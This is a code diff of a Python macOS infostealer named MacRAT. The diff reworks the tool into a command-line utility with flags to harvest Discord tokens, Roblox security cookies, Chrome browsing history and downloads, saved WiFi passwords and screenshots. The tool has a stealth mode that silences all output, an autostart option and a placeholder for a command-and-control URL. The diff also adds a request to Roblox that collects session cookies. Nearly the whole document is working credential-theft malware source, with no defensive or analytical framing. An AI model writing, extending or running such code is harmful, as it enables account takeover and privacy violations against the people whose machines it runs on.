@@ -10,6 +10,8 @@ import time
 import json
 import logging
 import sys
+import argparse
+import requests
 from pathlib import Path
 from typing import List, Dict, Any, Optional, Callable
 from Crypto.Cipher import AES
@@ -23,12 +25,10 @@ class Config:
     HISTORY_LIMIT = 200
     DOWNLOADS_LIMIT = 100
     THREAD_TIMEOUT = 30
-    RUN_INTERVAL = 60
-    PRINT_INTERVAL = 15
-    STEALTH = False  # Set to False to enable terminal output, True to suppress all output
+    STEALTH = False
     AUTO_START = False
     PLUGIN_DIR = OUTPUT_DIR / "plugins"
-    C2_URL = None  # Placeholder for future remote C2
+    C2_URL = None
 
 # === LOGGING SETUP ===
 os.makedirs(Config.OUTPUT_DIR, exist_ok=True)
@@ -96,7 +96,7 @@ def b64decode_key(key: str) -> bytes:
 
 # === CORE EXTRACTOR CLASS ===
 class MacRAT:
-    def __init__(self, config: Config, plugin_manager: Optional[PluginManager] = None):
+    def __init__(self, config: Config, plugin_manager: Optional[PluginManager] = None, stealth: Optional[bool] = None):
         self.config = config
         self.home = Path.home()
         self.app_support = self.home / "Library" / "Application Support"
@@ -112,17 +112,16 @@ class MacRAT:
         self.lock = threading.RLock()
         self.chrome_key = self.get_chrome_key()
         self.plugin_manager = plugin_manager or PluginManager(config.PLUGIN_DIR)
-        self._setup_stealth()
+        self._setup_stealth(stealth)
         if config.AUTO_START:
             self._setup_autostart()
 
-    def _setup_stealth(self):
-        # Only suppress output if STEALTH is True
-        if self.config.STEALTH:
+    def _setup_stealth(self, stealth_override=None):
+        stealth = self.config.STEALTH if stealth_override is None else stealth_override
+        if stealth:
             sys.stdout = open(os.devnull, "w")
             sys.stderr = open(os.devnull, "w")
         else:
-            # Restore stdout/stderr if previously redirected
             if hasattr(sys, "__stdout__") and hasattr(sys, "__stderr__"):
                 sys.stdout = sys.__stdout__
                 sys.stderr = sys.__stderr__
@@ -206,7 +205,6 @@ class MacRAT:
         for base in browser_paths:
             cookies_path = base / 'Default' / 'Cookies'
             if not cookies_path.exists():
-                # Try to find all profiles in this browser
                 if base.exists():
                     for profile in base.glob('*'):
                         if profile.is_dir() and (profile / 'Cookies').exists():
@@ -252,7 +250,6 @@ class MacRAT:
                 self._log_error(f"RobloxCookieError: {e}")
             finally:
                 temp_path.unlink(missing_ok=True)
-        # Also search all app support dirs for any stray Cookies DBs
         app_support = self.home / 'Library' / 'Application Support'
         for root, dirs, files in os.walk(app_support):
             for file in files:
@@ -277,6 +274,16 @@ class MacRAT:
                         self._log_error(f"RobloxCookieError: {e}")
                     finally:
                         temp_path.unlink(missing_ok=True)
+        # Try to get Roblox security cookie using requests (if user is logged in)
+        try:
+            session = requests.Session()
+            resp = session.get('https://www.roblox.com/')
+            for cookie in session.cookies:
+                if cookie.domain.endswith('roblox.com') and (cookie.name.lower() == '.roblosecure' or 'roblosecure' in cookie.name.lower()):
+                    with self.lock:
+                        self.roblox_cookies.add(cookie.value)
+        except Exception as e:
+            self._log_error(f"RobloxCookieRequestsError: {e}")
 
     def extract_history(self):
         history_db_path = self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'History'
@@ -327,10 +334,8 @@ class MacRAT:
             temp_path.unlink(missing_ok=True)
 
     def extract_wifi_passwords(self):
-        # Get all saved WiFi SSIDs and their passwords
         try:
             ssids = set()
-            # List all known WiFi networks
             airport_plist = os.path.expanduser("~/Library/Preferences/com.apple.airport.preferences.plist")
             if os.path.exists(airport_plist):
                 try:
@@ -343,7 +348,6 @@ class MacRAT:
                                 ssids.add(ssid)
                 except Exception as e:
                     self._log_error(f"WiFiPlistError: {e}")
-            # Also add currently visible networks
             scan = run_subprocess([
                 "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"
             ])
@@ -376,7 +380,8 @@ class MacRAT:
             self.errors.append(msg)
         logger.error(msg)
 
-    def run_all(self):
+    def run_selected(self, tokens=False, roblox=False, browser=False, downloads=False, wifi=False, screenshot=False):
+        threads = []
         base_paths = [
             self.app_support / 'discord' / 'Local Storage' / 'leveldb',
             self.app_support / 'discordcanary' / 'Local Storage' / 'leveldb',
@@ -387,19 +392,22 @@ class MacRAT:
             self.home / 'Library' / 'Application Support' / 'BraveSoftware' / 'Brave-Browser' / 'Default' / 'Local Storage' / 'leveldb',
             self.home / 'Library' / 'Application Support' / 'Chromium' / 'Default' / 'Local Storage' / 'leveldb',
         ]
-        threads = [
-            threading.Thread(target=self.extract_tokens, args=(base_paths,)),
-            threading.Thread(target=self.extract_roblox_cookies),
-            threading.Thread(target=self.extract_history),
-            threading.Thread(target=self.extract_downloads),
-            threading.Thread(target=self.extract_wifi_passwords),
-            threading.Thread(target=self.take_screenshot)
-        ]
+        if tokens:
+            threads.append(threading.Thread(target=self.extract_tokens, args=(base_paths,)))
+        if roblox:
+            threads.append(threading.Thread(target=self.extract_roblox_cookies))
+        if browser:
+            threads.append(threading.Thread(target=self.extract_history))
+        if downloads:
+            threads.append(threading.Thread(target=self.extract_downloads))
+        if wifi:
+            threads.append(threading.Thread(target=self.extract_wifi_passwords))
+        if screenshot:
+            threads.append(threading.Thread(target=self.take_screenshot))
         for t in threads:
             t.start()
         for t in threads:
             t.join(timeout=self.config.THREAD_TIMEOUT)
-        # Run plugins
         context = self.get_context()
         self.plugin_manager.run_all(context)
 
@@ -416,68 +424,134 @@ class MacRAT:
             "config": self.config,
         }
 
-    def save_all(self):
-        with self.lock:
-            out = {
-                "tokens": list(self.tokens),
-                "roblox_cookies": list(self.roblox_cookies),
-                "history": self.history,
-                "downloads": self.downloads,
-                "wifi_passwords": self.wifi_passwords,
-                "errors": self.errors[-10:],
-                "screenshot_path": str(self.screenshot_path),
-            }
-            out_file = self.output_dir / "collected_data.json"
-            with open(out_file, "w", encoding="utf-8") as f:
-                json.dump(out, f, indent=2)
-            logger.info(f"Data saved to {out_file}")
+    def save_selected(self, tokens=False, roblox=False, browser=False, downloads=False, wifi=False, screenshot=False):
+        out = {}
+        if tokens:
+            out["tokens"] = list(self.tokens)
+        if roblox:
+            out["roblox_cookies"] = list(self.roblox_cookies)
+        if browser:
+            out["history"] = self.history
+        if downloads:
+            out["downloads"] = self.downloads
+        if wifi:
+            out["wifi_passwords"] = self.wifi_passwords
+        if screenshot:
+            out["screenshot_path"] = str(self.screenshot_path)
+        out["errors"] = self.errors[-10:]
+        out_file = self.output_dir / "collected_data.json"
+        with open(out_file, "w", encoding="utf-8") as f:
+            json.dump(out, f, indent=2)
+        logger.info(f"Data saved to {out_file}")
 
-# === MAIN LOOP ===
+    def print_selected(self, tokens=False, roblox=False, browser=False, downloads=False, wifi=False, screenshot=False):
+        if tokens:
+            print("\n=== DISCORD TOKENS ===")
+            for t in sorted(self.tokens):
+                print(t)
+        if roblox:
+            print("\n=== ROBLOX SECURITY COOKIES (.ROBLOSECUREROBLOXSECURE) ===")
+            if self.roblox_cookies:
+                for c in sorted(self.roblox_cookies):
+                    print(c)
+            else:
+                print("No Roblox security cookies found.")
+        if browser:
+            print("\n=== BROWSER HISTORY (Last 10) ===")
+            for h in self.history[:10]:
+                print(f"{h['last_visit']} | {h['title']} | {h['url']}")
+        if downloads:
+            print("\n=== DOWNLOADS (Last 5) ===")
+            for d in self.downloads[:5]:
+                print(f"{d['path']} | {d['size']} bytes | {d['url']}")
+        if wifi:
+            print("\n=== WIFI PASSWORDS ===")
+            for ssid, pwd in self.wifi_passwords:
+                print(f"{ssid:<30} | {pwd}")
+        if screenshot:
+            print("\n=== SCREENSHOT PATH ===")
+            print(self.screenshot_path)
+        print("\n=== ERRORS (Last 5) ===")
+        for e in self.errors[-5:]:
+            print(e)
+
+    def show_saved(self):
+        out_file = self.output_dir / "collected_data.json"
+        if not out_file.exists():
+            print("No saved data found.")
+            return
+        with open(out_file, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        if "tokens" in data:
+            print("\n=== DISCORD TOKENS ===")
+            for t in sorted(data.get("tokens", [])):
+                print(t)
+        if "roblox_cookies" in data:
+            print("\n=== ROBLOX SECURITY COOKIES (.ROBLOSECUREROBLOXSECURE) ===")
+            roblox_cookies = data.get("roblox_cookies", [])
+            if roblox_cookies:
+                for c in sorted(roblox_cookies):
+                    print(c)
+            else:
+                print("No Roblox security cookies found.")
+        if "history" in data:
+            print("\n=== BROWSER HISTORY (Last 10) ===")
+            for h in data.get("history", [])[:10]:
+                print(f"{h['last_visit']} | {h['title']} | {h['url']}")
+        if "downloads" in data:
+            print("\n=== DOWNLOADS (Last 5) ===")
+            for d in data.get("downloads", [])[:5]:
+                print(f"{d['path']} | {d['size']} bytes | {d['url']}")
+        if "wifi_passwords" in data:
+            print("\n=== WIFI PASSWORDS ===")
+            for ssid, pwd in data.get("wifi_passwords", []):
+                print(f"{ssid:<30} | {pwd}")
+        if "screenshot_path" in data:
+            print("\n=== SCREENSHOT PATH ===")
+            print(data.get("screenshot_path", ""))
+        print("\n=== ERRORS (Last 5) ===")
+        for e in data.get("errors", [])[-5:]:
+            print(e)
+
+# === MAIN CLI ===
 def main():
-    rat = MacRAT(Config)
-    def periodic():
-        while True:
-            rat.run_all()
-            rat.save_all()
-            time.sleep(Config.RUN_INTERVAL)
-    t = threading.Thread(target=periodic, daemon=True)
-    t.start()
-    if not Config.STEALTH:
-        try:
-            while True:
-                time.sleep(Config.PRINT_INTERVAL)
-                with rat.lock:
-                    print("\n=== DISCORD TOKENS ===")
-                    for t in sorted(rat.tokens):
-                        print(t)
-                    print("\n=== ROBLOX SECURITY COOKIES (.ROBLOSECUREROBLOXSECURE) ===")
-                    if rat.roblox_cookies:
-                        for c in sorted(rat.roblox_cookies):
-                            print(c)
-                    else:
-                        print("No Roblox security cookies found.")
-                    print("\n=== BROWSER HISTORY (Last 10) ===")
-                    for h in rat.history[:10]:
-                        print(f"{h['last_visit']} | {h['title']} | {h['url']}")
-                    print("\n=== DOWNLOADS (Last 5) ===")
-                    for d in rat.downloads[:5]:
-                        print(f"{d['path']} | {d['size']} bytes | {d['url']}")
-                    print("\n=== WIFI PASSWORDS ===")
-                    for ssid, pwd in rat.wifi_passwords:
-                        print(f"{ssid:<30} | {pwd}")
-                    print("\n=== ERRORS (Last 5) ===")
-                    for e in rat.errors[-5:]:
-                        print(e)
-                    print("\n=== SCREENSHOT PATH ===")
-                    print(rat.screenshot_path)
-        except KeyboardInterrupt:
-            logger.info("Terminated by user.")
+    parser = argparse.ArgumentParser(
+        description="Mac Data Extractor Tool (nmap-style flags)",
+        formatter_class=argparse.RawTextHelpFormatter,
+        epilog="""
+Examples:
+  python main.py -t -r -w         # Extract Discord tokens, Roblox cookies, and WiFi passwords
+  python main.py -b -d --save    # Extract browser history and downloads, save to file
+  python main.py --show          # Show last saved results
+  python main.py -r --stealth    # Extract Roblox cookies silently
+  python main.py -t -r -w -s     # Extract tokens, Roblox, WiFi, and take screenshot
+        """
+    )
+    parser.add_argument("-t", "--tokens", action="store_true", help="Extract Discord tokens")
+    parser.add_argument("-r", "--roblox", action="store_true", help="Extract Roblox security cookies (local and via requests)")
+    parser.add_argument("-b", "--browser", action="store_true", help="Extract browser history")
+    parser.add_argument("-d", "--downloads", action="store_true", help="Extract browser downloads")
+    parser.add_argument("-w", "--wifi", action="store_true", help="Extract WiFi SSIDs and passwords")
+    parser.add_argument("-s", "--screenshot", action="store_true", help="Take a screenshot")
+    parser.add_argument("--save", action="store_true", help="Save results to file instead of printing")
+    parser.add_argument("--show", action="store_true", help="Show last saved results")
+    parser.add_argument("--stealth", action="store_true", help="Suppress all output")
+    args = parser.parse_args()
+    if args.show:
+        rat = MacRAT(Config, stealth=args.stealth)
+        rat.show_saved()
+        return
+    if not (args.tokens or args.roblox or args.browser or args.downloads or args.wifi or args.screenshot):
+        parser.error("No extraction selected. Use -t, -r, -b, -d, -w, -s or --show.")
+    rat = MacRAT(Config, stealth=args.stealth)
+    rat.run_selected(tokens=args.tokens, roblox=args.roblox, browser=args.browser, downloads=args.downloads, wifi=args.wifi, screenshot=args.screenshot)
+    if args.save:
+        rat.save_selected(tokens=args.tokens, roblox=args.roblox, browser=args.browser, downloads=args.downloads, wifi=args.wifi, screenshot=args.screenshot)
+        if not args.stealth:
+            print("Data saved to", rat.output_dir / "collected_data.json")
     else:
-        try:
-            while True:
-                time.sleep(3600)
-        except KeyboardInterrupt:
-            logger.info("Terminated by user.")
+        if not args.stealth:
+            rat.print_selected(tokens=args.tokens, roblox=args.roblox, browser=args.browser, downloads=args.downloads, wifi=args.wifi, screenshot=args.screenshot)
 
 if __name__ == "__main__":
     main()
